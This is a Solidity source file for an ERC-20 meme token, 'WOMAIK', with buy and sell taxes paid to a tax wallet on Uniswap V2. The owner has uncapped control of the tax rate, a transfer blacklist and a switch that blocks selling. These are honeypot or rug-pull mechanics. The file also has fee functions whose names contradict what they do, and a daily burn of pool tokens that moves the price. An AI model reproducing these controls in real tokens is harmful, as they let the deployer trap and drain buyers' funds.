// SPDX-License-Identifier: NONE

pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(address token, uint256 amountTokenDesired, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

contract K is Context, IERC20, Ownable {
    address constant DEADADDRESS = 0x000000000000000000000000000000000000dEaD;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint8 private constant _decimals = 8;
    uint256 private constant _totalSupply = 1e16 * 10 ** _decimals;
    string private constant _name = "WOMAIK";
    string private constant _symbol = "K";

    IUniswapV2Router02 private _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address payable private _taxWallet = payable(0x5550D2DC97023552410E65CcE3888acb0F888888);
    mapping(uint256 => bool) private _lpAmountAdjustment;
    bool private _inSwap = false;

    mapping(address => bool) public isExcludedFromFee;
    mapping(address => bool) public bots;
    address public uniswapV2Pair;
    uint256 public buyTax = 10;
    uint256 public sellTax = 10;
    uint256 public taxSwapThreshold = 0;
    bool public swapEnabled = false;

    event ExcludeFromFees(address);
    event IncludeFromFees(address);

    event LPAmountAdjustment(uint256 timestamp);

    modifier lockTheSwap() {
        _inSwap = true;
        _;
        _inSwap = false;
    }

    constructor() {
        _balances[_msgSender()] = _totalSupply;
        isExcludedFromFee[owner()] = true;
        isExcludedFromFee[address(this)] = true;
        isExcludedFromFee[_taxWallet] = true;

        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());

        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        _spendAllowance(from, _msgSender(), amount);
        _transfer(from, to, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(_balances[from] >= amount, "ERC20: transfer amount exceeds balance");
        require(!bots[from] && !bots[to], "bots");

        uint256 taxAmount = 0;
        if (from != owner() && to != owner() && !_inSwap) {
            if (!swapEnabled && to == uniswapV2Pair) revert("No!");

            //swap
            uint256 contractTokenBalance = balanceOf(address(this));
            if (swapEnabled && to == uniswapV2Pair && contractTokenBalance > taxSwapThreshold) {
                swapToFee(contractTokenBalance > amount ? amount : contractTokenBalance);
            }

            //tax
            if (!isExcludedFromFee[from] && !isExcludedFromFee[to]) {
                if (from == uniswapV2Pair) taxAmount = amount * buyTax / 100;
                if (to == uniswapV2Pair) taxAmount = amount * sellTax / 100;

                if (taxAmount > 0) {
                    _balances[address(this)] += taxAmount;
                    emit Transfer(from, address(this), taxAmount);
                }
            }
        }

        _balances[from] -= amount;
        _balances[to] += amount - taxAmount;
        emit Transfer(from, to, amount - taxAmount);
    }

    receive() external payable { }
    fallback() external payable { }

    function swapToFee(uint256 tokenAmount) private lockTheSwap {
        if (tokenAmount == 0) return;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapV2Router.WETH();
        _approve(address(this), address(_uniswapV2Router), tokenAmount);
        _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
        if (address(this).balance > 0) _taxWallet.transfer(address(this).balance);
    }

    function manualSwap() external {
        require(_msgSender() == _taxWallet);
        swapToFee(balanceOf(address(this)));
    }

    function addBots(address[] calldata accounts) public onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            bots[accounts[i]] = true;
        }
    }

    function delBots(address[] calldata accounts) public onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            bots[accounts[i]] = false;
        }
    }

    function excludeFromFees(address[] calldata accounts) external onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            isExcludedFromFee[accounts[i]] = false;
            emit ExcludeFromFees(accounts[i]);
        }
    }

    function includeFromFees(address[] calldata accounts) external onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            isExcludedFromFee[accounts[i]] = true;
            emit IncludeFromFees(accounts[i]);
        }
    }

    function setTax(uint256 _buyTax, uint256 _sellTax) external onlyOwner {
        buyTax = _buyTax;
        sellTax = _sellTax;
    }

    function setSwapEnabled(bool enable) external onlyOwner {
        swapEnabled = enable;
    }

    function setTaxSwapThreshold(uint256 threshold) external onlyOwner {
        taxSwapThreshold = threshold;
    }

    function setTaxWallet( address payable wallet) external onlyOwner {
        _taxWallet = wallet;
    }

    //only call from EOA

    function adjustment() public {
        uint256 midnight = (block.timestamp / 1 days) * 1 days;
        if (!_lpAmountAdjustment[midnight]) {
            uint256 balance = balanceOf(uniswapV2Pair);
            //100b
            if (balance > 1e11 * 10 ** _decimals) {
                uint256 burnAmount = balance * 5 / 100;
                _balances[uniswapV2Pair] -= burnAmount;
                _balances[DEADADDRESS] += burnAmount;
                (bool ok,) = uniswapV2Pair.call(abi.encodeWithSignature("sync()"));
                emit Transfer(uniswapV2Pair, DEADADDRESS, burnAmount);
            }

            _lpAmountAdjustment[midnight] = true;
            emit LPAmountAdjustment(midnight);
        }
    }
}
